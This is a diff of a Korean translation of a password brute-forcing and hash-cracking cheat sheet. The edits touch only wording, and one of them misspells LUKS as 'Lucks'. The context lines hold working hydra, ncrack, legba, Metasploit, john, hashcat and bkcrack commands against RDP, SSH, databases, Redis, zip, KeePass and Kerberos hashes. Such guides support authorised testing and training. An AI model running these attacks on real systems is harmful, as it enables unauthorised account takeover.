@@ -309,7 +309,7 @@ legba pgsql --username admin --password wordlists/passwords.txt --target localho
 ```
 ### PPTP
 
-`.deb` 패키지를 [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)에서 다운로드하여 설치할 수 있습니다.
+`.deb` 패키지를 설치하려면 [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)에서 다운로드할 수 있습니다.
 ```bash
 sudo dpkg -i thc-pptp-bruter*.deb #Install the package
 cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
@@ -320,7 +320,7 @@ ncrack -vv --user <User> -P pwds.txt rdp://<IP>
 hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
 legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
 ```
-### Redis
+### 레디스
 ```bash
 msf> use auxiliary/scanner/redis/redis_login
 nmap --script redis-brute -p 6379 <IP>
@@ -406,7 +406,7 @@ legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --targ
 
 ### STOMP (ActiveMQ, RabbitMQ, HornetQ 및 OpenMQ)
 
-STOMP 텍스트 프로토콜은 **RabbitMQ, ActiveMQ, HornetQ 및 OpenMQ와 같은 인기 있는 메시지 큐 서비스와의 원활한 통신 및 상호작용을 허용하는** 널리 사용되는 메시징 프로토콜입니다. 이는 메시지를 교환하고 다양한 메시징 작업을 수행하는 표준화되고 효율적인 접근 방식을 제공합니다.
+STOMP 텍스트 프로토콜은 **RabbitMQ, ActiveMQ, HornetQ 및 OpenMQ와 같은 인기 있는 메시지 큐 서비스와 원활한 통신 및 상호 작용을 허용하는** 널리 사용되는 메시징 프로토콜입니다. 이는 메시지를 교환하고 다양한 메시징 작업을 수행하는 표준화되고 효율적인 접근 방식을 제공합니다.
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
 ```
@@ -480,7 +480,7 @@ hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 ```
 #### 알려진 평문 zip 공격
 
-암호화된 zip 안에 포함된 **파일의 평문** (또는 평문의 일부)을 알아야 합니다. 암호화된 zip 안에 포함된 **파일의 이름과 크기**를 확인하려면 다음을 실행하세요: **`7z l encrypted.zip`**\
+암호화된 zip 안에 포함된 **파일의 평문**(또는 평문의 일부)을 알아야 합니다. 암호화된 zip 안에 포함된 **파일의 이름과 크기**를 확인하려면 다음을 실행하세요: **`7z l encrypted.zip`**\
 [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)를 릴리스 페이지에서 다운로드하세요.
 ```bash
 # You need to create a zip file containing only the file that is inside the encrypted zip
@@ -535,7 +535,7 @@ Format:USUARIO:ID:HASH_LM:HASH_NT:::
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
 hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
 ```
-### 키패스
+### Keepass
 ```bash
 sudo apt-get install -y kpcli #Install keepass tools like keepass2john
 keepass2john file.kdbx > hash #The keepass is only using password
@@ -549,7 +549,7 @@ john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
 hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
 ```
-### Luks 이미지
+### Lucks 이미지
 
 #### 방법 1
 
@@ -644,7 +644,7 @@ john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
 
 #### Hashcat 공격
 
-- **단어 목록 공격** (`-a 0`) 규칙과 함께
+- **단어 목록 공격** (`-a 0`) 규칙 포함
 
 **Hashcat**은 이미 **규칙이 포함된 폴더**와 함께 제공되지만 [**여기에서 다른 흥미로운 규칙을 찾을 수 있습니다**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
 ```
